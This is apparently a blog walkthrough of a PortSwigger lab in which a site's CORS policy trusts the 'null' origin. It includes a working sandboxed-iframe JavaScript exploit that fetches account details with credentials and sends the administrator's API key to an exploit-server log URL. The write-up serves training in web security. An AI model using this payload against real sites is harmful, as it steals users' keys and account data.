---
title: CORS vulnerability with trusted null origin
date: 2025-10-21 00:00:00 +0800
categories: [Portswigger, Cross-origin resource sharing (CORS)]
tags: [portswigger, writeup, walkthrough, web, cors]     # TAG names should always be lowercase
description: In this post we will solve a CORS Lab on portswigger, have fun reading.
---

## Lab: CORS vulnerability with trusted null origin

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

### Lab 2 Exploitation

Starting with exploring our website we will login with the creds provided and see the requests after that, we will find that there is a request after signing in called `/accountDetails` and when seeing the response we will find that it gives back the information related to our account and also there is a header called `Access-Control-Allow-Credentials: true` which suggesting that it may support CORS.

![img-description](/assets/img/PortSwigger/CORS/1/request.png)
_Request_

So to make sure if it supports CORS or not we will use the origin header and type any imaginary website to see if it will accepts it or not

![img-description](/assets/img/PortSwigger/CORS/2/request.png)
_CORS_

When we added the imaginary website we will see that it didn’t trust it as we can see in the response so let’s try if it accepts null

![img-description](/assets/img/PortSwigger/CORS/2/NullReq.png)
_Null Request_

and yes it accepted it so let’s begin with the exploitation, go to the exploit server and this will be our exploit.

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

but why did we put it in this iframe and what does this mean.

- `sandbox` **removes the origin** (because `allow-same-origin` is NOT included).
- `srcdoc` creates a document directly from the embedded HTML.
- This causes the JavaScript to run in a **"null" origin context**, so any requests it makes will send `Origin: null`.

That’s exactly what the vulnerable backend is expecting/trusting, So send the request and you will see our api in the log, submit it and the lab is solved.

![img-description](/assets/img/PortSwigger/CORS/2/api.png)
_Api Key_
